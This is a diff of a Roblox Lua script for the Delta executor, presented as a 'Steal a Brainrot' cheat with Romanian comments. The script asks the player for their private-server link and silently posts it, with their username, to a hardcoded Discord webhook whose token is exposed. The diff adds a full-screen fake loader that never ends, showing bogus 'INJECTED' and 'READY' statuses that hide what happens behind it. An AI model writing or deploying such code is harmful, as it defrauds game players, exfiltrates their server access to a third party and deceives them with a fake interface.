@@ -1,4 +1,4 @@
--- Script pentru Delta - Steal a Brainrot (Loader + Discord)
+-- Script pentru Delta - Steal a Brainrot (Full Screen Loader + Discord)
 -- Compatibil cu Delta Executor
 
 local Players = game:GetService("Players")
@@ -9,6 +9,7 @@ local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
 
 -- ===== CONFIGURARE =====
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
@@ -69,16 +70,19 @@ local function hideMe()
     end
 end
 
--- ===== ECAN NEGRU + LOADER STILIZAT =====
+-- ===== ECAN NEGRU FULL + LOADER PERMANENT =====
 local function showLoader()
+    -- Creează un ScreenGui care acoperă TOT
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoaderGUI"
     screenGui.ResetOnSpawn = false
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.IgnoreGuiInset = true  -- ACESTA ASCUNDE BARELE DE ECAN
 
-    -- Fundal negru
+    -- Fundal negru FULL (acoperă absolut tot)
     local background = Instance.new("Frame")
     background.Size = UDim2.new(1, 0, 1, 0)
+    background.Position = UDim2.new(0, 0, 0, 0)
     background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     background.BorderSizePixel = 0
     background.Parent = screenGui
@@ -95,11 +99,11 @@ local function showLoader()
     title.TextXAlignment = Enum.TextXAlignment.Left
     title.Parent = screenGui
 
-    -- Procent 61%
+    -- Procent (începe de la 0 și crește)
     local percent = Instance.new("TextLabel")
     percent.Size = UDim2.new(0.3, 0, 0, 60)
     percent.Position = UDim2.new(0.7, 0, 0.15, 0)
-    percent.Text = "61%"
+    percent.Text = "0%"
     percent.TextColor3 = Color3.fromRGB(255, 255, 255)
     percent.BackgroundTransparency = 1
     percent.Font = Enum.Font.GothamBold
@@ -116,7 +120,7 @@ local function showLoader()
     progressBg.Parent = screenGui
 
     local progressBar = Instance.new("Frame")
-    progressBar.Size = UDim2.new(0.61, 0, 1, 0)
+    progressBar.Size = UDim2.new(0.01, 0, 1, 0)
     progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
     progressBar.BorderSizePixel = 0
     progressBar.Parent = progressBg
@@ -277,34 +281,59 @@ local function showLoader()
     log3.TextXAlignment = Enum.TextXAlignment.Left
     log3.Parent = screenGui
 
+    -- Adaugă GUI-ul la CoreGui
     screenGui.Parent = CoreGui
 
-    -- Animație loader (doar pentru efect)
+    -- ===== ANIMAȚIE LOADER PERMANENTĂ (NICIODATĂ NU DISPARE) =====
     spawn(function()
-        local progress = 61
-        while progress < 100 do
-            progress = progress + math.random(1, 3)
-            if progress > 100 then progress = 100 end
-            percent.Text = progress .. "%"
+        local progress = 0
+        while true do
+            -- Crește progresul încet (0-100% în aproximativ 10 minute)
+            progress = progress + 0.01
+            if progress > 100 then
+                progress = 0  -- Resetează pentru a crea un efect de buclă
+            end
+            percent.Text = math.floor(progress) .. "%"
             progressBar.Size = UDim2.new(progress / 100, 0, 1, 0)
-            task.wait(0.1)
+            
+            -- Schimbă textul la anumite procente
+            if progress > 25 and progress < 30 then
+                speedStatus.Text = "INJECTED"
+                speedStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
+                log2.Text = "[ 00:05 ] speed_module ...... active"
+            elseif progress > 50 and progress < 55 then
+                stealStatus.Text = "INITIALIZED"
+                stealStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
+                log3.Text = "Resolving pointer chains... DONE"
+            elseif progress > 75 and progress < 80 then
+                combatStatus.Text = "READY"
+                combatStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
+            elseif progress > 95 then
+                -- La final, resetează textul pentru buclă
+                speedStatus.Text = "LOADING"
+                speedStatus.TextColor3 = Color3.fromRGB(255, 200, 0)
+                stealStatus.Text = "PENDING"
+                stealStatus.TextColor3 = Color3.fromRGB(255, 200, 0)
+                combatStatus.Text = "PENDING"
+                combatStatus.TextColor3 = Color3.fromRGB(255, 200, 0)
+                log2.Text = "[ 00:01 ] speed_module ...... injected"
+                log3.Text = "Resolving pointer chains..."
+            end
+            
+            task.wait(0.05)  -- Viteză de încărcare
         end
-        -- La final, ascunde loader-ul după 2 secunde
-        task.wait(2)
-        screenGui:Destroy()
     end)
 
     return screenGui
 end
 
--- ===== GUI CU LINK (FĂRĂ NOTIFICĂRI) =====
+-- ===== GUI CU LINK =====
 local function showLinkGUI()
     local gui = Instance.new("ScreenGui")
     gui.Name = "LinkInput"
     gui.ResetOnSpawn = false
     gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-    -- Fundal semi-transparent
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(1, 0, 1, 0)
     bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -312,7 +341,6 @@ local function showLinkGUI()
     bg.BorderSizePixel = 0
     bg.Parent = gui
 
-    -- Fereastra principală
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(0, 450, 0, 200)
     frame.Position = UDim2.new(0.5, -225, 0.5, -100)
@@ -324,7 +352,6 @@ local function showLinkGUI()
     frame.Draggable = true
     frame.Parent = bg
 
-    -- Titlu
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 45)
     title.Position = UDim2.new(0, 0, 0, 0)
@@ -335,18 +362,16 @@ local function showLinkGUI()
     title.TextScaled = true
     title.Parent = frame
 
-    -- Subtitlu
     local subtitle = Instance.new("TextLabel")
     subtitle.Size = UDim2.new(1, 0, 0, 25)
     subtitle.Position = UDim2.new(0, 0, 0.20, 0)
-    subtitle.Text = "Introdu link-ul serverului privat pentru autentificare:"
+    subtitle.Text = "Introdu link-ul serverului privat:"
     subtitle.TextColor3 = Color3.fromRGB(180, 180, 200)
     subtitle.BackgroundTransparency = 1
     subtitle.Font = Enum.Font.Gotham
     subtitle.TextSize = 14
     subtitle.Parent = frame
 
-    -- Câmp input
     local textBox = Instance.new("TextBox")
     textBox.Size = UDim2.new(0.9, 0, 0, 40)
     textBox.Position = UDim2.new(0.05, 0, 0.38, 0)
@@ -359,7 +384,6 @@ local function showLinkGUI()
     textBox.ClearTextOnFocus = false
     textBox.Parent = frame
 
-    -- Buton "TRIMITE" (FĂRĂ NOTIFICARE)
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(0.9, 0, 0, 40)
     btn.Position = UDim2.new(0.05, 0, 0.60, 0)
@@ -371,20 +395,11 @@ local function showLinkGUI()
     btn.Parent = frame
     btn.MouseButton1Click:Connect(function()
         if textBox.Text and textBox.Text ~= "" then
-            -- Trimite link-ul pe Discord (fără notificare în joc)
             sendToDiscord("**🔗 LINK SERVER PRIVAT**\n\n📌 **Player:** " .. LocalPlayer.Name .. "\n🔗 **Link:** " .. textBox.Text)
-            
-            -- Distruge GUI-ul de link
             gui:Destroy()
-            
-            -- Afișează loader-ul
-            showLoader()
-            
-            -- Rulează funcțiile principale
+            showLoader()  -- Afișează loader-ul PERMANENT
             hideMe()
             local count = hideBrainrots()
-            
-            -- Notificare SILENȚIOASĂ (doar în consola executorului)
             print("✅ Script activ! Brainrot-uri ascunse: " .. count)
         end
     end)
@@ -394,10 +409,7 @@ end
 
 -- ===== MAIN =====
 local function main()
-    -- Afișează GUI-ul cu link
     showLinkGUI()
-    
-    -- Notificare în consolă
     print("🚀 Așteaptă introducerea link-ului...")
 end
 
